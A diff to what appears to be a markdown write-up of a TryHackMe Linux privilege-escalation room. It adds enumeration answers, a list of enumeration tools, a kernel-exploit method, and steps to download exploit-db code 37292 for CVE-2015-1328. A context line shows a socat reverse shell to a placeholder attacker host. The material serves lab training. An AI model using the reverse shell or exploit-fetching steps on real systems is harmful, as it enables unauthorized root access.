@@ -12,6 +12,20 @@ Ref:
 
 - [THM: Linux Privilege Escalation](https://tryhackme.com/r/room/linprivesc)
 
+- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 
+
+- [LinEnum](https://github.com/rebootuser/LinEnum)
+
+- [LES - Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) 
+
+- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+
+- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)
+
+- [CVE](https://cve.org/)
+
+- [NIST](https://nvd.nist.gov/vuln)
+
 - [Named Pipe](https://www.linuxjournal.com/article/2156) 
 
 
@@ -35,7 +49,7 @@ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid
 
 - [DisroWatch](https://distrowatch.com/dwres.php?resource=major "Link")
 
-- [Link](https://www.youtube.com/watch?v=zc5Z6C2zmNA)
+- [Link](https://www.youtube.com/watch?v=7WQndt-1WzE)
 
 
 ---
@@ -308,10 +322,113 @@ As we are in the Linux realm, familiarity with Linux commands, in general, will 
 ---
 
 1. What is the hostname of the target system?
-2. What is the Linux kernel version of the target system?
-3. What Linux is this?
-4. What version of the Python language is installed on the system?
+wade7363
+```
+hostname
+```
+
+2. What is the Linux kernel version of the target system? 
+3.13.0-24-generic
+```
+uname -a
+
+or 
+
+cat /proc/version
+```
+```
+Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Li
+nux
+```
+
+3. What Linux is this? Ubuntu 14.04 LTS
+ 
+ cat /etc/issue 
+```
+ cd etc
+ cat issue
+```
+
+4. What version of the Python language is installed on the system? 
+2.7.6
+```
+python --version or python -V
+```
+
+
+
 5. What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)
+![img](/assets/img/lpe20.png)
+```
+CVE-2015-1328
+```
+---
+
+
+Task 4
+Automated Enumeration Tools
+Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.
+
+The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.
+
+- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 
+
+- [LinEnum](https://github.com/rebootuser/LinEnum)
+
+- [LES - Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) 
+
+- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+
+- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)
 
 ---
 
+Task 5 Privilege Escalation: Kernel Exploits
+---
+
+Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.
+
+
+Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.
+
+
+The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.
+
+
+The Kernel exploit methodology is simple;
+
+1. Identify the kernel version
+2. Search and find an exploit code for the kernel version of the target system
+3. Run the exploit
+
+Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.
+
+
+
+### Research sources:
+
+1. Based on your findings, you can use Google to search for an existing exploit code.
+
+2. Sources such as https://www.linuxkernelcves.com/cves can also be useful.
+
+3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
+
+### Hints/Notes:
+
+1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
+
+2. Be sure you ```understand how the exploit code works``` ```BEFORE``` you ```launch``` it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
+
+3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
+
+4. You can transfer the exploit code from your machine to the target system using the ```SimpleHTTPServer``` Python module and ```wget``` respectively.
+
+
+---
+Step 1: Search the exploit code
+![img](/assets/img/lpe21.png)
+Link: https://www.exploit-db.com/download/37292
+
+Step 2: download the code the attack machine
+Ref: https://www.hostinger.com/tutorials/wget-command-examples/
+wget https://www.exploit-db.com/download/37292.c
